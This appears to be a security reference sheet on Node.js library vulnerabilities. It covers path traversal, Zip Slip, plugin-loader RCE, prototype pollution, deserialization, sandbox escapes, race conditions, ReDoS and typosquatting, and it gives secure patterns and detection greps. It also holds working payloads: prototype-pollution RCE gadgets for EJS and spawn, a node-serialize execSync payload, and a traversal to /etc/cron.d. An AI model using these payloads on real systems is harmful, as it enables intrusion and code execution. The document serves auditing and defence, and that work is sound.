# Node.js Library-Level Attack Patterns

Common vulnerabilities in Node.js applications arising from npm library behavior, path handling, and module loading. These are distinct from framework-level attacks (Express/Next.js) — they target the underlying library assumptions.

---

## 1. Path Handling Vulnerabilities

### path.join() Traversal

`path.join()` resolves `../` sequences. If user input flows into `path.join()` without post-validation, traversal is possible:

```javascript
// VULNERABLE: user controls filename
const dest = path.join('/app/uploads/', userFilename);
// userFilename = "../../../etc/passwd" → dest = "/etc/passwd"

// SECURE: validate after join
const dest = path.resolve('/app/uploads/', userFilename);
if (!dest.startsWith('/app/uploads/')) throw new Error("Traversal blocked");
```

**Key insight:** `path.join()` normalizes but doesn't validate. `path.resolve()` + prefix check is the correct pattern.

### path.resolve() vs path.join()

| Function | Behavior with `../` | Behavior with absolute path |
|----------|--------------------|-----------------------------|
| `path.join('/base', '../etc')` | `/etc` (resolves relative) | `/base/../etc` → `/etc` |
| `path.join('/base', '/etc')` | `/base/etc` (treats as relative) | ❌ Does NOT resolve absolute |
| `path.resolve('/base', '../etc')` | `/etc` (resolves from CWD) | `/etc` (absolute wins) |
| `path.resolve('/base', '/etc')` | `/etc` (absolute overrides base) | ⚠️ Ignores base entirely |

**Pitfall:** `path.resolve('/base', userInput)` where userInput is `/etc/passwd` → returns `/etc/passwd` (ignores base). Always check the result starts with the intended prefix.

---

## 2. Zip/Archive Libraries

### yauzl (most popular Node.js zip reader)

| Option | What it blocks | What it DOESN'T block |
|--------|---------------|----------------------|
| `strictFileNames: true` | Absolute paths (`/`), backslashes (`\`) | Relative traversal (`../`) |
| `decodeStrings: false` | N/A (returns Buffer) | Must `.toString()` manually |
| `lazyEntries: true` | N/A (performance) | N/A |

**Exploit pattern:**
```javascript
// Zip entry: "../malicious.js"
// Extraction: path.join('/app/plugins/archive/', '../malicious.js')
// Result: '/app/plugins/malicious.js' — escaped the archive directory
```

**Detection:** Look for `yauzl.open()` + `path.join(dest, entry.fileName)` without a subsequent prefix check.

### adm-zip

No built-in path validation at all. Any zip entry name is used as-is:

```javascript
const zip = new AdmZip(buffer);
zip.extractAllTo('/app/uploads/'); // ../../../etc/cron.d/shell works
```

### archiver (zip creation)

Not directly vulnerable (creates zips), but if attacker controls filenames added to an archive that's later extracted elsewhere, the traversal payload persists.

---

## 3. Module Loading as Code Execution

### require() / import()

`require()` executes JavaScript immediately upon loading. If an attacker can write a `.js` file to a directory that's later `require()`'d, they achieve RCE:

```javascript
// Plugin loader pattern (VULNERABLE)
const files = fs.readdirSync('/app/plugins/');
files.filter(f => f.endsWith('.js')).forEach(f => {
    const plugin = require(path.join('/app/plugins/', f));
    // Attacker's code executes HERE
});
```

**Common patterns that enable this:**
- Plugin/extension systems that load from a directory
- Template engines that `require()` helpers
- Test runners that load test files dynamically
- Build tools that load config files (`webpack.config.js`, `.babelrc.js`)

### module.createRequire()

Same as `require()` but with a custom base path:
```javascript
const require_plugin = module.createRequire('file:///app/plugins/');
const plugin = require_plugin('/tmp/app/plugins/evil.js'); // executes evil.js
```

### Plugin Interface Validation

Many plugin systems validate the loaded module's exports before use. Common patterns:

```javascript
// Must export specific functions
if (typeof plugin.get !== 'function') throw new Error("Invalid plugin");
if (typeof plugin.getName !== 'function') throw new Error("Missing getName");
if (typeof plugin.run !== 'function') throw new Error("Missing run");
```

**When crafting exploit plugins, always check:**
1. What validation `loadPlugin()` performs on the module exports
2. What methods the execution loop calls (getName, run, execute, handle, etc.)
3. What return values are expected (some systems check return types)

---

## 4. Prototype Pollution via Libraries

### Deep Merge Libraries

| Library | Vulnerable Versions | Payload |
|---------|-------------------|---------|
| `lodash.merge` | < 4.17.12 | `{"__proto__": {"isAdmin": true}}` |
| `lodash.set` | < 4.17.12 | `set(obj, '__proto__.isAdmin', true)` |
| `deepmerge` | < 4.2.2 | `{"__proto__": {"polluted": true}}` |
| `merge-deep` | all versions | `{"__proto__": {"polluted": true}}` |
| `defaults-deep` | all versions | `{"__proto__": {"polluted": true}}` |
| `mixin-deep` | < 2.0.1 | `{"constructor": {"prototype": {"polluted": true}}}` |

### Prototype Pollution → RCE Gadgets

```javascript
// If app uses child_process.spawn/exec with options from polluted prototype:
// Pollute: {"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/evil.js"}}}
// Next spawn() inherits polluted options → RCE

// EJS template engine gadget:
// Pollute: {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"}}
// Next ejs.render() → RCE

// Pug template engine gadget:
// Pollute: {"__proto__": {"block": {"type": "Text", "val": "x]});process.exit()//"}}}
```

### Detection in Source Code

```bash
# Grep for vulnerable patterns
grep -rn "merge\|assign\|extend\|defaults" --include="*.js" | grep -v node_modules
grep -rn "\\[key\\]\\s*=" --include="*.js" | grep -v node_modules
# Look for: obj[key] = value where key is user-controlled
```

---

## 5. Deserialization / Unsafe Eval Patterns

### node-serialize

```javascript
// VULNERABLE: unserialize() executes IIFE in serialized data
const serialize = require('node-serialize');
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"id\")}()"}';
serialize.unserialize(payload); // RCE
```

### vm / vm2 Sandbox Escapes

```javascript
// vm module is NOT a security boundary
const vm = require('vm');
const sandbox = {};
vm.runInNewContext('this.constructor.constructor("return process")().exit()', sandbox);
// Escapes sandbox via constructor chain

// vm2 (deprecated) — multiple CVEs for sandbox escape
// CVE-2023-37466, CVE-2023-32314, etc.
// If target uses vm2 < 3.9.19, sandbox escape is likely possible
```

### Function() constructor

```javascript
// Equivalent to eval() — if user input reaches Function():
const fn = new Function('return ' + userInput);
fn(); // Code execution

// Also: setTimeout/setInterval with string argument
setTimeout(userInput, 1000); // Executes as code if string
```

---

## 6. File System Race Conditions (TOCTOU)

```javascript
// VULNERABLE: check-then-use pattern
if (fs.existsSync(filepath)) {           // Time of Check
    const data = fs.readFileSync(filepath); // Time of Use
    // Attacker replaces file between check and use (symlink swap)
}

// VULNERABLE: stat then open
const stat = fs.statSync(filepath);
if (stat.isFile()) {
    fs.readFileSync(filepath); // File could be replaced with symlink
}
```

**Exploit:** Create a symlink that initially points to a safe file (passes validation), then swap it to point to `/etc/passwd` before the read.

---

## 7. HTTP Parameter Pollution in Express

```javascript
// Express parses duplicate params as arrays:
// GET /api?role=user&role=admin
// req.query.role = ['user', 'admin']

// If backend does: if (req.query.role === 'admin') → false (it's an array)
// But if: if (req.query.role.includes('admin')) → true
// Or MongoDB: {role: req.query.role} → {role: {$in: ['user', 'admin']}}
```

---

## 8. Regular Expression DoS (ReDoS)

```javascript
// Vulnerable regex patterns (exponential backtracking):
/^(a+)+$/           // "aaaaaaaaaaaaaaaaX" → catastrophic backtracking
/(a|a)+$/           // Same issue with alternation
/([a-zA-Z]+)*$/     // Nested quantifiers

// Detection: look for nested quantifiers in user-facing validation
// Impact: single request can hang the event loop for minutes → DoS
```

**Common locations:** Email validation, URL parsing, input sanitization regexes.

---

## 9. Dependency Confusion / Typosquatting

Not a code-level vuln but relevant for supply chain attacks:

```bash
# Check if internal package names exist on public npm
npm info @company/internal-package 2>&1 | grep -q "404" && echo "Safe" || echo "RISK"

# Check for typosquats of popular packages
# lodash → 1odash, lodash-utils, lodahs
# express → expres, expresss, express-js
```

---

## Quick Reference: What to Check When You See...

| You See | Check For |
|---------|-----------|
| `path.join(base, userInput)` | Path traversal (no prefix validation after join) |
| `require(dynamicPath)` | Arbitrary code execution if path controllable |
| `yauzl` / `adm-zip` / `unzipper` | Zip Slip (entry names with `../`) |
| `JSON.parse()` + deep merge | Prototype pollution via `__proto__` |
| `eval()` / `Function()` / `vm.runInContext()` | Direct code execution |
| `child_process.exec(cmd + userInput)` | Command injection |
| `fs.readFileSync(userInput)` | Arbitrary file read |
| `new RegExp(userInput)` | ReDoS if input has nested quantifiers |
| `serialize` / `unserialize` | Deserialization RCE |
| Plugin/extension loader pattern | Write file to plugin dir → RCE |
